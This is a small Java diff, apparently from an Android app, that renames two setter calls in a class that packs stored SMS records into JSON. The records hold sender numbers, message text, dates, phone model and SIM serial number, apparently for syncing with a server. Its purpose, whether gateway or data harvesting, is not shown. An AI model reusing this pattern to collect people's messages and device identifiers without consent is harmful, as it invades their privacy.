@@ -69,7 +69,7 @@ public class ProducerJSON {
                 serverID = infoDatabaseSMS.getString(infoDatabaseSMS.getColumnIndex(DatabaseSMS.getSMS_serverID)) ;
 
                 smsNew.add(new smsnew_jsonArray(id,number,text,date,smsID,userData,brand,model,SimSerialNumber));
-                mainJsonObject.setSmsNew(smsNew);
+                mainJsonObject.setSmsnew(smsNew);
 
 //            Log.d(save_user.pTag, "json crated > smsNew[] "+ id +" | "+ number +" | "+ text +" | "+ date +" | "+ smsID +" | "+ userData +" | "+ brand +" | "+ model +" | "+ SimSerialNumber );
             }
@@ -98,7 +98,7 @@ public class ProducerJSON {
                 serverID = infoDatabaseSMS.getString(infoDatabaseSMS.getColumnIndex(DatabaseSMS.sendSMS_serverID)) ;
 
                 smsSent.add(new sentsms_jsonArray(id,smsID,serverID));
-                mainJsonObject.setSmsSent(smsSent);
+                mainJsonObject.setSentsms(smsSent);
 
                 Log.d(av.pTag, "json crated > smsSent[] "+ id +" | "+ smsID +" | "+ serverID );
             }
